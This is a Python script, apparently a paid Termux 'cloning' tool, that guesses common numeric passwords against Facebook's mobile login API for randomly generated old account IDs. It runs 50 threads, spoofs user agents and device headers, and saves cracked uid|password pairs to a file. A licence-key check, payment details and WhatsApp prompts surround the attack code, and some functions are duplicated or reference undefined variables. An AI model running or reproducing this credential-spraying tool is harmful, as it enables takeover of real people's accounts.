"""
    @ code by ---( Shani john )---
    @ Github : https://github.com/shani723327
    @ WhatsApp : https://wa.me/+923200795589
    
"""
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,httpx,mechanize,rich,json,subprocess
try:
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from datetime import datetime
	from random import randint as rr
	from random import choice as rc
	from string import digits as digits
	from os import system as cmd
	from concurrent.futures import ThreadPoolExecutor as ShaniXD 
except ModuleNotFoundError:
	os.system('pip install rich')
	os.system('pip install requests')
	os.system('pip install bs4')
sys.stdout.write('\x1b]2; ⏤͟͟͞͞ ⍣⃝😈𝗦𝗛𝗔𝗡𝗜🫀❤️‍🩹⍣⃝😈 ͟͞⏤ 𝗥𝗦🥰\x07')
import requests
from datetime import datetime
import hashlib
import platform
import urllib.parse
import os
import sys
import time
import uuid

APPROVED_URL = "https://raw.githubusercontent.com/shani723327/OLD-FBS/main/Shani.txt"
ADMIN_NUMBER = "923200795589"
DEVICE_FILE = ".device_id"

# ================= BOOT =================
def boot():
    os.system("clear")

    print("\033[1;92m╔══════════════════════════════════════╗\033[0m")
    time.sleep(0.3)

    print("\033[1;92m║               S H A N I              ║\033[0m")
    time.sleep(0.5)

    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
    time.sleep(0.3)

    print("\033[1;96m║  Assalam O Alaikum                   ║\033[0m")
    time.sleep(0.6)

    print("\033[1;90m║  Initializing Security Protocols...  ║\033[0m")
    time.sleep(0.5)

    print("\033[1;92m║  Loading Modules...                  ║\033[0m")
    time.sleep(0.7)

    print("\033[1;92m║  System Ready ✔                      ║\033[0m")
    time.sleep(0.5)

    print("\033[1;92m╚══════════════════════════════════════╝\033[0m\n")

    time.sleep(1)

boot()

# ================= DEVICE KEY (FINAL FIX) =================
def get_device_key():

    # agar already saved hai → same use hoga
    if os.path.exists(DEVICE_FILE):
        with open(DEVICE_FILE, "r") as f:
            return f.read().strip()

    # stable base (device specific)
    base = platform.node() + str(uuid.getnode())

    hash_val = hashlib.sha256(base.encode()).hexdigest()

    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    key = ""

    # short 7 char key
    for i in range(7):
        idx = int(hash_val[i*4:(i*4)+4], 16) % len(chars)
        key += chars[idx]

    # save permanently
    with open(DEVICE_FILE, "w") as f:
        f.write(key)

    return key

# ================= APPROVAL CHECK (FAST) =================
def check_key(key):

    try:
        url = APPROVED_URL + "?nocache=" + str(time.time())

        headers = {
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "User-Agent": "Mozilla/5.0"
        }

        data = requests.get(url, headers=headers, timeout=8).text

        today = datetime.today()
        key = key.strip().upper()

        for line in data.splitlines():

            parts = line.strip().split("|")
            if len(parts) != 2:
                continue

            saved_key = parts[0].strip().upper()
            exp_date = parts[1].strip()

            if saved_key == key:

                try:
                    exp = datetime.strptime(exp_date, "%d-%m-%Y")
                except:
                    return "not", None

                if today <= exp:
                    return "approved", exp_date
                else:
                    return "expired", exp_date

        return "not", None

    except:
        return "not", None

# ================= ACCESS DENIED =================
def access_denied_block(key, status, exp=None):

    print("\n\033[1;91m╔══════════════════════════════════════╗\033[0m")
    print("\033[1;91m║           ACCESS DENIED              ║\033[0m")
    print("\033[1;91m╚══════════════════════════════════════╝\033[0m\n")

    print("\033[1;93mYOUR KEY:\033[0m", key)

    if status == "expired":
        print("\033[1;91mYOUR KEY IS EXPIRED ✖\033[0m")
        print("\033[1;93mEXP:\033[0m", exp)
    else:
        print("\033[1;91mYOUR KEY IS NOT APPROVED ✖\033[0m")

# ================= WHATSAPP =================
def send_whatsapp(key, status, exp=None):

    if status == "approved":
        return

    if status == "expired":
        msg = "Hi Admin\nKey EXPIRED\nKey: {}\nEXP: {}".format(key, exp)
    else:
        msg = "Hi Admin\nKey NOT APPROVED\nKey: {}".format(key)

    encoded = urllib.parse.quote(msg)
    url = "whatsapp://send?phone={}&text={}".format(ADMIN_NUMBER, encoded)

    os.system('am start -a android.intent.action.VIEW -d "{}"'.format(url))

# ================= PAYMENT BOX =================
def payment_box():
    print("\n\033[1;92m╔══════════════════════════════════════╗\033[0m")
    print("\033[1;92m║  ACCOUNT NAME  :  MUHAMMAD SAFDAR    ║\033[0m")
    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
    print("\033[1;92m║  Easypaisa: 03060725589              ║\033[0m")
    print("\033[1;92m║  JazzCash : 03060725589              ║\033[0m")
    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
    print("\033[1;92m║  3 DAYS   : 150 PKR                  ║\033[0m")
    print("\033[1;92m║  7 DAYS   : 300 PKR                  ║\033[0m")
    print("\033[1;92m║  30 DAYS  : 500 PKR                  ║\033[0m")
    print("\033[1;92m╚══════════════════════════════════════╝\033[0m\n")

# ================= RUN =================
key = get_device_key()
status, exp = check_key(key)

if status == "approved":
    print("APPROVED DEVICE")

else:
    access_denied_block(key, status, exp)
    payment_box()
    send_whatsapp(key, status, exp)
    sys.exit()
def ___uax___():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
os.system('xdg-open https://wa.me/+923200795589')

##-------------(Basic colors)-------------------
yellow = "\033[1;33m"
black = "\033[1;90m"
red = "\033[1;91m"
green = "\033[1;32m"
blue = "\033[1;34m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
r_cyan = "\033[38;5;122m"
r_purple = "\033[38;5;147m"
r_green = "\033[38;5;112m"
white = "\033[0;97m"
reset = '\x1b[0m'
pink = "\x1b[38;5;205m"
brown = "\x1b[38;5;208m"
colors = [
    "\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m",
    "\033[0;92m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m",
    "\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m",
    "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m",
    "\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m",
    "\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m",
    "\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m", "\033[0;104m", "\033[1;104m",
    "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"
]
#---------------------------| Loop |---------------------------#
id,id2,loop,ok,cp=[],[],0,0,0;user=[];total_hits = 0
oks = []
cps = []
loop = 0
id = []
#---------------------------| Linex |---------------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{black}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{white}')
#---------------------------| Logo |---------------------------#
logo=(f'''\033[1;92m███████╗██╗  ██╗ █████╗ ███╗   ██╗██╗
██╔════╝██║  ██║██╔══██╗████╗  ██║██║
███████╗███████║███████║██╔██╗ ██║██║
╚════██║██╔══██║██╔══██║██║╚██╗██║██║
███████║██║  ██║██║  ██║██║ ╚████║██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝
   \033[1;91m𝗢𝗡𝗘 𝗠𝗔𝗡 𝗔𝗥𝗠𝗬💀                 \033[1;32m1.0      \033[0m
\033[1;90m{15 * '⎯⎯⎯'}
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Tool Owner  \033[1;90m➤\033[1;97m  SHANI MALIK 💗😻
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m WhatsApp    \033[1;90m➤\033[1;97m  +923200795589
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Tool Type   \033[1;90m➤\033[1;97m  PREMIUM PAID TOOL🔥
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Device Key  \033[1;90m➤\033[1;97m   {key}
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Expiry Date \033[1;90m➤\033[1;97m   {exp}
\x1b[1;90m{15 * '⎯⎯⎯'}''')
import hashlib
import platform
from datetime import datetime


# -------- FIXED DEVICE KEY (NO RANDOM) --------
def get_device_key():
    raw = platform.node() + platform.machine() + platform.system()
    return hashlib.sha256(raw.encode()).hexdigest()[:10]


# -------- APPROVAL + EXPIRY CHECK --------
def check_key(key):
    try:
        data = requests.get(APPROVED_URL).text.splitlines()
        today = datetime.today()

        for line in data:
            line = line.strip()

            if "|" in line:
                saved_key, exp_date = line.split("|")

                saved_key = saved_key.strip()
                exp_date = exp_date.strip()

                if saved_key == key:
                    exp = datetime.strptime(exp_date, "%d-%m-%Y")

                    if today <= exp:
                        return "approved", exp_date
                    else:
                        return "expired", exp_date

        return "not", None

    except:
        return "not", None
# -------------(CHECK ID CREATION YEAR)--------------
def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ['1000000000']:
            Shani_dgk = '2009'
        elif uid[:9] in ['100000000']:
            Shani_dgk = '2009'
        elif uid[:8] in ['10000000']:
            Shani_dgk = '2009'
        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            Shani_dgk = '2009'
        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']:
            Shani_dgk = '2010'
        elif uid[:6] in ['100001']:
            Shani_dgk = '2010'
        elif uid[:6] in ['100002', '100003']:
            Shani_dgk = '2011'
        elif uid[:6] in ['100004']:
            Shani_dgk = '2012'
        elif uid[:6] in ['100005', '100006']:
            Shani_dgk = '2013'
        elif uid[:6] in ['100007', '100008']:
            Shani_dgk = '2014'
        elif uid[:6] in ['100009']:
            Shani_dgk = '2015'
        elif uid[:5] in ['10001']:
            Shani_dgk = '2016'
        elif uid[:5] in ['10002']:
            Shani_dgk = '2017'
        elif uid[:5] in ['10003']:
            Shani_dgk = '2018'
        elif uid[:5] in ['10004']:
            Shani_dgk = '2019'
        elif uid[:5] in ['10005']:
            Shani_dgk = '2020'
        elif uid[:5] in ['10006']:
            Shani_dgk = '2021'
        elif uid[:5] in ['10009']:
            Shani_dgk = '2023'
        elif uid[:5] in ['10007', '10008']:
            Shani_dgk = '2022'
        else:
            Shani_dgk = ''
    elif len(uid) in [9, 10]:
        Shani_dgk = '2008'
    elif len(uid) == 8:
        Shani_dgk = '2007'
    elif len(uid) == 7:
        Shani_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ['61']:
        Shani_dgk = '2024'
    else:
        Shani_dgk = ''
    return Shani_dgk
        	
#---------------------------[ MAIN MENU ]---------------------------#
def WEHSHI________():
    clear()
    print(f"\033[1;90m[\033[1;97m1\033[1;90m]\033[0;97m 2010 - 2012")
    print(f"\033[1;90m[\033[1;97m2\033[1;90m]\033[0;97m 2009 - 2010")
    print(f"\033[1;90m[\033[1;97m3\033[1;90m]\033[0;97m 2011 - 2014")
    print(f"\x1b[1;90m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\033[0;97m") 
    option = input(f"\033[1;90m[\033[1;97m?\033[1;90m]\033[0;97m Enter Your Choice: ")
    if option == "1":__2010___2011()
    elif option == "2":____old2009___()
    elif option == "3":_____old2011_____()
    else:
        print(f"{red}[!] Invalid choice..."); WEHSHI________()


#---------------------------[ 2010-2011 CLONING ]---------------------------#

def __2010___2011():
    user = []
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    for i in range(int(limit)):
        data = random.choice(["100001","100002","100003","100004"])+str(random.choice(range(111111111, 999999999)))
        user.append(data)
    with ShaniXD(max_workers=50) as Shani:
        clear()
        total_ids = int(limit)
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
        linex()
        for mal in user:
            uid = mal
            Shani.submit(____old____, uid, total_ids)
    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(ok)}")
    print(f"{white}➤ Total CP: {red}{len(cp)}")
    linex()
    exit()
    
#---------------------------[ 2009-2010 CLONING ]---------------------------#
def ____old2009___():
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    for _ in range(int(limit)):
        nmp = ''.join(random.choice(digits) for _ in range(9))
        user.append(nmp)
		
    with ShaniXD(max_workers=50) as Shani:
        clear()
        total_ids = int(limit)
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{total_ids}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
        linex()
        for love in user:
            uid = "100000" + love
            Shani.submit(____old____, uid, total_ids)
    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(ok)}")
    print(f"{white}➤ Total CP: {red}{len(cp)}")
    linex()
    exit()

#---------------------------[ 2011-2014 CLONING ]---------------------------#
def _____old2011_____():
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    prefixes = ['10000']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('123456789', k=10))
        
        uid = prefix + suffix
        user.append(uid)
    with ShaniXD(max_workers=50) as Shani:
        clear()
        total_ids = int(limit)
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{total_ids}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
        linex()
        for uid in user:
            Shani.submit(____old____, uid,total_ids)

    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(oks)}")
    
    linex()
    exit()
    
    
    
def ____old____(uid,total_ids):
    global loop
    session = requests.session()
    
    try:
        sys.stdout.write(f"[😈]\033[1;35m𝗦𝗛𝗔𝗡𝗜~𝗠𝗔𝗟𝗜𝗞  {green}{loop}/{red}{total_ids} | {green}OK:{len(oks)}\033[0m\r");sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789','1234567890'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': ___uax___(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\033[1;92m[Shani-OK💚] {uid} ● {pw}\033[1;97m ● \033[1;92m{creationyear(uid)}")
                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(pw)+"|"+creationyear(uid)+"\n");oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\033[1;92m[Shani-OK💚] {uid} ● {pw}\033[1;97m ● \033[1;92m{creationyear(uid)}")
                open("/sdcard/OLD-OK.txt",'a').write(str(uid)+"|"+str(pw)+"|"+creationyear(uid)+"\n");oks.append(uid)
                break
            else:pass
        loop+=1
    except Exception as e:pass

WEHSHI________()
